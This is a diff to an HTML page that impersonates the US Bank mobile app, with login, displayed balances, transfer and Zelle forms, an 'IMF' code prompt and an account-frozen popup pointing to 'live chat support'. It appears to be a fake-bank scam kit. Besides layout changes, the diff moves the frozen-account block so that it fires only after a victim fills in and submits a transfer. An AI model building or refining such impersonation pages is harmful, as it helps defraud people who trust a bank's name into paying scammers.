@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>US Bank</title>
     <meta property="og:title" content="US Bank">
     <meta property="og:description" content="Log in to your US Bank account securely.">
@@ -17,12 +17,33 @@
             --text-light-blue: #a4c2f4; --text-gray: #e0e0e0; --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
             --action-blue: #1f5dc1; --bg-gray: #f4f5f8; --zelle-purple: #6f2da8; 
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: var(--font-family); background-color: #e0e0e0; display: flex; justify-content: center; }
-        .mobile-container { width: 100%; max-width: 414px; background-color: var(--bg-gray); height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* FIXED SIZE: Locks the body to the screen size */
+        html, body { 
+            height: 100%; 
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden; 
+        }
+        body { font-family: var(--font-family); background-color: #e0e0e0; display: flex; justify-content: center; align-items: flex-start; }
+        
+        /* FIXED SIZE: Mobile container takes full height and handles its own scrolling */
+        .mobile-container { 
+            width: 100%; 
+            max-width: 414px; 
+            height: 100vh; 
+            height: 100dvh; /* Handles mobile browser address bars */
+            background-color: var(--bg-gray); 
+            position: relative; 
+            box-shadow: 0 0 20px rgba(0,0,0,0.1); 
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+        }
         .hidden { display: none !important; }
         
-        /* MAIN PAGES */
+        /* MAIN PAGES (Scrollable internally) */
+        #main-page { height: 100%; overflow-y: auto; background-color: var(--bg-gray); }
         .navbar { background-color: #ffffff; display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         .hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
         .hamburger span { display: block; width: 22px; height: 2px; background-color: #555; }
@@ -47,10 +68,11 @@
         .scroll-content { width: 100%; font-size: 0; background-color: #ffffff; position: relative; z-index: 2; }
         .scroll-content img { width: 100%; height: auto; display: block; margin: 0; padding: 0; }
         
-        /* LOGIN & SIGNUP */
+        /* LOGIN & SIGNUP (Scrollable internally) */
+        #login-page, #create-account-page, #profile-page { height: 100%; overflow-y: auto; background-color: #ffffff; display: flex; flex-direction: column; }
         .login-header { display: flex; align-items: center; padding: 16px; background-color: #ffffff; border-bottom: 1px solid #e0e0e0; position: sticky; top: 0; z-index: 100; }
         .back-btn { background: none; border: none; font-size: 24px; color: #333; cursor: pointer; margin-right: 16px; }
-        .form-container { padding: 24px; background-color: #ffffff; flex: 1; overflow-y: auto; }
+        .form-container { padding: 24px; background-color: #ffffff; flex: 1; }
         .fdic-box { border: 1px solid #dcdcdc; border-radius: 8px; padding: 12px 16px; display: flex; align-items: center; margin-bottom: 32px; }
         .fdic-logo { font-size: 20px; font-weight: 900; color: #0f2e5b; margin-right: 12px; letter-spacing: 0.5px; }
         .fdic-text { font-size: 13px; color: #333; font-style: italic; line-height: 1.3; }
@@ -78,99 +100,100 @@
         .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
         .submit-btn { background-color: var(--action-blue); color: #ffffff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; }
 
-        /* APP WRAPPER & DASHBOARD (FIXED HEIGHT) */
-        #app-wrapper { position: relative; flex: 1; display: flex; flex-direction: column; height: 100vh; overflow: hidden; background-color: var(--bg-gray); }
-        .dash-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 16px; background-color: #ffffff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
-        .dash-header-title { color: var(--usbank-blue); font-size: 16px; font-weight: 600; }
+        /* APP WRAPPER & DASHBOARD (Fixed size, internal scroll) */
+        #app-wrapper { height: 100%; display: flex; flex-direction: column; background-color: var(--bg-gray); overflow: hidden; }
+        .dash-header { display: flex; justify-content: space-between; align-items: center; padding: 16px; background-color: #ffffff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; flex-shrink: 0; }
+        .dash-header-title { color: var(--usbank-blue); font-size: 18px; font-weight: 600; }
         .header-actions { display: flex; gap: 16px; align-items: center; }
-        .icon-btn { width: 30px; height: 30px; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 50%; background-color: #f0f4f9; }
-        .icon-btn svg { width: 16px; height: 16px; fill: var(--usbank-blue); }
+        .icon-btn { width: 32px; height: 32px; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 50%; background-color: #f0f4f9; }
+        .icon-btn svg { width: 18px; height: 18px; fill: var(--usbank-blue); }
         
-        /* COMPACT DASHBOARD FITTING */
-        .app-content { padding: 10px 12px; flex: 1; overflow-y: auto; padding-bottom: 75px; }
-        .dash-date { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
-        .dash-greeting { font-size: 20px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 8px; }
+        /* ONLY THIS CONTENT AREA SCROLLS */
+        .app-content { padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 100px; }
+        .dash-date { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
+        .dash-greeting { font-size: 32px; font-weight: 300; color: #333; margin-bottom: 24px; line-height: 1.2; }
         
-        .offer-banner { background-color: #ffffff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 8px 10px; display: flex; align-items: center; margin-bottom: 10px; position: relative; }
+        .offer-banner { background-color: #ffffff; border: 1px solid #e0e0e0; border-radius: 12px; padding: 16px; display: flex; align-items: center; margin-bottom: 24px; position: relative; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
         .offer-text { flex: 1; }
-        .offer-text span { font-size: 8px; color: #777; text-transform: uppercase; letter-spacing: 0.5px; display: block; margin-bottom: 2px; }
-        .offer-text h4 { font-size: 11px; color: #333; font-weight: 600; margin-bottom: 2px; }
-        .offer-text p { font-size: 10px; color: #666; }
-        .close-offer { position: absolute; top: 6px; right: 8px; color: #aaa; font-size: 14px; cursor: pointer; }
+        .offer-text span { font-size: 10px; color: #777; text-transform: uppercase; letter-spacing: 0.5px; display: block; margin-bottom: 4px; }
+        .offer-text h4 { font-size: 14px; color: #333; font-weight: 600; margin-bottom: 2px; }
+        .offer-text p { font-size: 12px; color: #666; }
+        .close-offer { position: absolute; top: 12px; right: 12px; color: #aaa; font-size: 18px; cursor: pointer; }
         
-        .section-title { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; margin-top: 8px; }
-        .account-card { background-color: #ffffff; border-radius: 8px; padding: 10px 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); cursor: pointer; }
-        .account-name { font-size: 13px; color: #333; font-weight: 500; }
-        .account-balance { font-size: 14px; color: var(--usbank-blue); font-weight: 700; }
-        .account-balance::after { content: ' \203A'; margin-left: 4px; font-weight: normal; color: #aaa; font-size: 16px; }
-        .total-balance-row { display: flex; justify-content: space-between; padding: 0 12px; margin-top: 2px; margin-bottom: 8px; font-size: 12px; color: #555; }
-
-        .transaction-item { background-color: #ffffff; border-radius: 8px; padding: 10px 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
-        .transaction-left h5 { font-size: 13px; color: #333; margin-bottom: 2px; }
-        .transaction-left p { font-size: 10px; color: #777; }
-        .transaction-amount { font-size: 13px; font-weight: 700; color: #333; }
+        .section-title { font-size: 12px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; margin-top: 24px; font-weight: 600; }
+        
+        .account-card { background-color: #ffffff; border-radius: 12px; padding: 24px; display: flex; flex-direction: column; margin-bottom: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); cursor: pointer; }
+        .account-name { font-size: 14px; color: #555; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .account-balance { font-size: 34px; color: #111; font-weight: 400; margin-bottom: 4px; }
+        .account-sub { font-size: 13px; color: #888; }
+        
+        .total-balance-row { display: flex; justify-content: space-between; padding: 0 4px; margin-top: 4px; margin-bottom: 24px; font-size: 14px; color: #555; font-weight: 500; }
+        .transaction-item { background-color: #ffffff; border-radius: 12px; padding: 18px 20px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+        .transaction-left h5 { font-size: 15px; color: #333; margin-bottom: 4px; font-weight: 600; }
+        .transaction-left p { font-size: 12px; color: #777; }
+        .transaction-amount { font-size: 16px; font-weight: 600; color: #333; }
         .amount-deposit { color: #22c55e !important; }
 
-        /* TRANSFER & PAY */
-        .transfer-page-bg { background-color: var(--usbank-red); height: 100%; overflow-y: auto; padding-bottom: 75px; }
-        .transfer-page-header { padding: 20px 16px 12px 16px; }
-        .transfer-page-title { font-size: 24px; font-weight: 400; color: #ffffff; }
-        .tf-card { display: flex; align-items: center; background-color: #ffffff; padding: 14px; border-radius: 10px; margin: 0 16px 10px 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
-        .tf-icon-bg { width: 40px; height: 40px; background-color: #fce8e8; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 12px; flex-shrink: 0; }
-        .tf-icon-bg svg { width: 20px; height: 20px; fill: var(--usbank-red); }
+        /* TRANSFER & PAY (Scrollable internally) */
+        .transfer-page-bg { background-color: var(--usbank-red); height: 100%; overflow-y: auto; padding-bottom: 100px; }
+        .transfer-page-header { padding: 32px 20px 20px 20px; }
+        .transfer-page-title { font-size: 32px; font-weight: 400; color: #ffffff; }
+        .tf-card { display: flex; align-items: center; background-color: #ffffff; padding: 20px; border-radius: 16px; margin: 0 20px 16px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
+        .tf-icon-bg { width: 50px; height: 50px; background-color: #fce8e8; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 16px; flex-shrink: 0; }
+        .tf-icon-bg svg { width: 24px; height: 24px; fill: var(--usbank-red); }
         .tf-icon-bg.zelle-icon { background-color: #f4e8fc; }
         .tf-icon-bg.zelle-icon svg { fill: var(--zelle-purple); }
         .tf-info { flex: 1; }
-        .tf-info h4 { font-size: 15px; color: #000; font-weight: 700; margin-bottom: 2px; }
-        .tf-info p { font-size: 12px; color: #666; }
-        .tf-chevron { color: #ccc; font-size: 22px; }
+        .tf-info h4 { font-size: 17px; color: #000; font-weight: 700; margin-bottom: 2px; }
+        .tf-info p { font-size: 13px; color: #666; }
+        .tf-chevron { color: #ccc; font-size: 26px; }
 
-        /* TRANSFER FORMS */
-        .form-page { background-color: #ffffff; height: 100%; overflow-y: auto; padding-bottom: 75px; }
-        .form-page-header { padding: 14px 16px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; background-color: #fff; z-index: 50; }
-        .form-page-title { font-size: 16px; font-weight: 600; color: var(--usbank-blue); }
-        .form-body { padding: 16px; }
-        .form-section-title { font-size: 12px; font-weight: 700; color: var(--usbank-blue); margin: 12px 0 8px 0; padding-bottom: 4px; border-bottom: 1px solid #eee; }
+        /* TRANSFER FORMS (Scrollable internally) */
+        .form-page { background-color: #ffffff; height: 100%; overflow-y: auto; padding-bottom: 100px; }
+        .form-page-header { padding: 16px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; background-color: #fff; z-index: 50; }
+        .form-page-title { font-size: 18px; font-weight: 600; color: var(--usbank-blue); }
+        .form-body { padding: 24px; }
+        .form-section-title { font-size: 14px; font-weight: 700; color: var(--usbank-blue); margin: 20px 0 12px 0; padding-bottom: 4px; border-bottom: 1px solid #eee; }
         .form-section-title:first-child { margin-top: 0; }
-        .input-field { margin-bottom: 10px; }
-        .input-field label { display: block; font-size: 11px; font-weight: 600; color: #555; margin-bottom: 4px; text-transform: uppercase; }
-        .input-field input, .input-field select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background-color: #fafafa; }
+        .input-field { margin-bottom: 16px; }
+        .input-field label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 6px; text-transform: uppercase; }
+        .input-field input, .input-field select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; background-color: #fafafa; }
         .input-field input:focus, .input-field select:focus { outline: none; border-color: var(--action-blue); background-color: #fff; }
-        .account-select { width: 100%; padding: 10px; border: 1px solid #dcdcdc; border-radius: 6px; font-size: 14px; background-color: #f0f2f5; color: #1f5dc1; font-weight: 600; appearance: none; }
+        .account-select { width: 100%; padding: 14px; border: 1px solid #dcdcdc; border-radius: 8px; font-size: 16px; background-color: #f0f2f5; color: #1f5dc1; font-weight: 600; appearance: none; }
 
         /* MODALS */
-        .modal-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.6); z-index: 1000; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .modal-box { background-color: #ffffff; width: 100%; border-radius: 16px; padding: 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-height: 90vh; overflow-y: auto; }
+        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.6); z-index: 2000; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .modal-box { background-color: #ffffff; width: 100%; max-width: 380px; border-radius: 16px; padding: 32px 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-height: 90vh; overflow-y: auto; }
         .modal-box .logo { justify-content: center; margin-bottom: 16px; }
-        .success-check { width: 50px; height: 50px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 12px auto; }
-        .success-check svg { width: 24px; height: 24px; fill: #2e7d32; }
-        .modal-title { font-size: 18px; font-weight: 700; color: #333; margin-bottom: 4px; }
-        .modal-amount { font-size: 32px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 16px; }
-        .modal-details { text-align: left; background-color: #f8f9fa; border-radius: 8px; padding: 12px; margin-bottom: 16px; }
-        .modal-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+        .success-check { width: 60px; height: 60px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 16px auto; }
+        .success-check svg { width: 30px; height: 30px; fill: #2e7d32; }
+        .modal-title { font-size: 20px; font-weight: 700; color: #333; margin-bottom: 4px; }
+        .modal-amount { font-size: 36px; font-weight: 700; color: var(--usbank-blue); margin-bottom: 24px; }
+        .modal-details { text-align: left; background-color: #f8f9fa; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
+        .modal-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
         .modal-row span:first-child { color: #666; }
         .modal-row span:last-child { font-weight: 600; color: #333; text-align: right; max-width: 60%; }
         
-        #imf-modal .modal-box { padding: 32px 24px; }
-        .auth-lock-icon { width: 40px; height: 40px; margin: 0 auto 12px; }
+        #imf-modal .modal-box { padding: 40px 24px; }
+        .auth-lock-icon { width: 50px; height: 50px; margin: 0 auto 15px; }
         .auth-lock-icon svg { width: 100%; height: 100%; fill: none; stroke: #d32f2f; stroke-width: 2.5; }
-        #imf-modal h3 { color: #d32f2f; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
-        #imf-modal p { color: #333; font-size: 14px; margin-bottom: 20px; line-height: 1.4; }
-        #imf-modal .input-field input { border: 1px solid #ccc; border-radius: 8px; padding: 14px; text-align: center; font-size: 16px; margin-bottom: 16px; }
-        #imf-modal .btn-verify { background: #d32f2f; color: white; border-radius: 30px; padding: 14px; font-size: 15px; font-weight: 600; margin-bottom: 12px; border: none; cursor: pointer; width: 100%; }
-        #imf-modal .btn-cancel { background: #ffffff; color: #333; border: 1px solid #ccc; border-radius: 30px; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; }
+        #imf-modal h3 { color: #d32f2f; font-size: 22px; font-weight: 700; margin-bottom: 12px; }
+        #imf-modal p { color: #333; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        #imf-modal .input-field input { border: 1px solid #ccc; border-radius: 8px; padding: 16px; text-align: center; font-size: 18px; margin-bottom: 20px; }
+        #imf-modal .btn-verify { background: #d32f2f; color: white; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; margin-bottom: 15px; border: none; cursor: pointer; width: 100%; }
+        #imf-modal .btn-cancel { background: #ffffff; color: #333; border: 1px solid #ccc; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
 
-        #frozen-overlay { background: rgba(0,0,0,0.7); z-index: 3000; }
-        #frozen-overlay .modal-box { padding: 32px 24px; }
-        .frozen-icon { width: 50px; height: 50px; margin: 0 auto 16px; }
+        #frozen-overlay { z-index: 3000; }
+        #frozen-overlay .modal-box { padding: 40px 24px; }
+        .frozen-icon { width: 60px; height: 60px; margin: 0 auto 20px; }
         .frozen-icon svg { width: 100%; height: 100%; fill: #d32f2f; }
-        #frozen-overlay h2 { color: #d32f2f; font-size: 20px; font-weight: 700; margin-bottom: 12px; }
-        #frozen-overlay p { color: #333; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }
-        #frozen-overlay .btn-close { background: #d32f2f; color: white; border-radius: 30px; padding: 14px; font-size: 15px; font-weight: 600; border: none; cursor: pointer; width: 100%; }
+        #frozen-overlay h2 { color: #d32f2f; font-size: 22px; font-weight: 700; margin-bottom: 15px; }
+        #frozen-overlay p { color: #333; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
+        #frozen-overlay .btn-close { background: #d32f2f; color: white; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; width: 100%; }
 
-        /* BOTTOM NAV (FIXED) */
+        /* BOTTOM NAV (Fixed to bottom) */
         .image-bottom-nav { position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 414px; z-index: 100; background-color: #ffffff; }
-        .image-bottom-nav img { width: 100%; display: block; height: 65px; object-fit: cover; }
+        .image-bottom-nav img { width: 100%; display: block; height: 75px; object-fit: cover; }
         .nav-click-overlay { position: absolute; bottom: 0; height: 100%; cursor: pointer; z-index: 101; }
         .overlay-accounts { left: 0; width: 25%; }
         .overlay-pay-transfer { left: 25%; width: 25%; }
@@ -179,10 +202,10 @@
 
         /* PROFILE */
         .profile-info { margin-top: 16px; }
-        .profile-row { display: flex; flex-direction: column; padding: 12px 0; border-bottom: 1px solid #eee; }
-        .profile-row label { font-size: 11px; color: #777; text-transform: uppercase; font-weight: 600; margin-bottom: 4px; }
-        .profile-row span { font-size: 16px; color: #333; font-weight: 500; }
-        .logout-btn { background-color: #fff; color: var(--usbank-red); border: 1px solid var(--usbank-red); padding: 14px; width: 100%; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 24px; margin-bottom: 20px; }
+        .profile-row { display: flex; flex-direction: column; padding: 16px 0; border-bottom: 1px solid #eee; }
+        .profile-row label { font-size: 12px; color: #777; text-transform: uppercase; font-weight: 600; margin-bottom: 4px; }
+        .profile-row span { font-size: 18px; color: #333; font-weight: 500; }
+        .logout-btn { background-color: #fff; color: var(--usbank-red); border: 1px solid var(--usbank-red); padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 32px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
@@ -280,7 +303,7 @@
         </div>
 
         <div id="app-wrapper" class="hidden">
-            <div id="tab-accounts">
+            <div id="tab-accounts" style="height: 100%; display: flex; flex-direction: column;">
                 <header class="dash-header">
                     <div class="hamburger"><span></span><span></span><span></span></div>
                     <div class="dash-header-title">Accounts</div>
@@ -296,17 +319,30 @@
                         <div class="offer-text"><span>PREQUALIFIED CREDIT CARD OFFER</span><h4>Earn 20,000 free bonus points!</h4><p>U.S. Bank Altitude® Go Visa Signature® Card</p></div>
                         <div class="close-offer">×</div>
                     </div>
+                    
                     <div class="section-title">CHECKING & SAVINGS</div>
-                    <div class="account-card"><div class="account-name">Checking ...1112</div><div class="account-balance" id="dash-bal-checking">$0.00</div></div>
-                    <div class="account-card"><div class="account-name">Savings ...2223</div><div class="account-balance" id="dash-bal-savings">$0.00</div></div>
+                    <div class="account-card">
+                        <div class="account-name">Checking ...1112</div>
+                        <div class="account-balance" id="dash-bal-checking">$0.00</div>
+                        <div class="account-sub">Available balance</div>
+                    </div>
+                    <div class="account-card">
+                        <div class="account-name">Savings ...2223</div>
+                        <div class="account-balance" id="dash-bal-savings">$0.00</div>
+                        <div class="account-sub">Available balance</div>
+                    </div>
                     <div class="total-balance-row"><div>Total balance</div><div id="dash-bal-total">$0.00</div></div>
+                    
                     <div class="section-title">CREDIT CARDS</div>
-                    <div class="account-card"><div class="account-name">Credit card ...2222</div><div class="account-balance" id="dash-bal-credit">$500.99</div></div>
-                    <div class="total-balance-row" style="margin-bottom: 10px;"><div>Available credit $9,799.28</div></div>
+                    <div class="account-card">
+                        <div class="account-name">Credit card ...2222</div>
+                        <div class="account-balance" id="dash-bal-credit">$500.99</div>
+                        <div class="account-sub">Available credit $9,799.28</div>
+                    </div>
                 </div>
             </div>
 
-            <div id="tab-history" class="hidden">
+            <div id="tab-history" class="hidden" style="height: 100%; display: flex; flex-direction: column;">
                 <header class="dash-header"><button class="back-btn" onclick="switchTab('accounts')">&#8592;</button><div class="dash-header-title">Transaction History</div><div style="width: 32px;"></div> </header>
                 <div class="app-content"><div id="history-list-full"></div></div>
             </div>
@@ -443,6 +479,7 @@
             } catch(e) { console.error("Sync error:", e); }
         }
 
+        // liveSync updates balances, but NEVER prompts the frozen modal automatically
         async function liveSync() {
             if (!currentUser) return;
             await syncData();
@@ -501,12 +538,6 @@
 
         async function switchTab(tabName) {
             if(!currentUser) return;
-            if(tabName === 'pay-transfer' && currentUser.status !== 'Active') {
-                document.getElementById('frozen-text').textContent = `Account ${currentUser.status.toLowerCase()}, contact live chat support for more information.`;
-                document.getElementById('frozen-overlay').classList.remove('hidden');
-                return;
-            }
-
             currentTab = tabName;
             sessionStorage.setItem('activeTab', tabName);
 
@@ -528,12 +559,6 @@
         }
 
         function openTransferForm(type) {
-            if(currentUser.status !== 'Active') {
-                document.getElementById('frozen-text').textContent = `Account ${currentUser.status.toLowerCase()}, contact live chat support for more information.`;
-                document.getElementById('frozen-overlay').classList.remove('hidden');
-                return;
-            }
-            
             document.getElementById('tab-pay-transfer').classList.add('hidden');
             updateBalancesUI();
 
@@ -546,6 +571,7 @@
         function handleTransferSubmit(event, transferTo) {
             event.preventDefault();
 
+            // THE ONLY PLACE THE FROZEN MODAL IS CALLED
             if(currentUser.status !== 'Active') {
                 document.getElementById('frozen-text').textContent = `Account ${currentUser.status.toLowerCase()}, contact live chat support for more information.`;
                 document.getElementById('frozen-overlay').classList.remove('hidden');
@@ -698,7 +724,6 @@
                 }
                 
                 document.getElementById('login-form').reset();
-                
                 showPage('app-wrapper'); 
                 switchTab('accounts');
                 
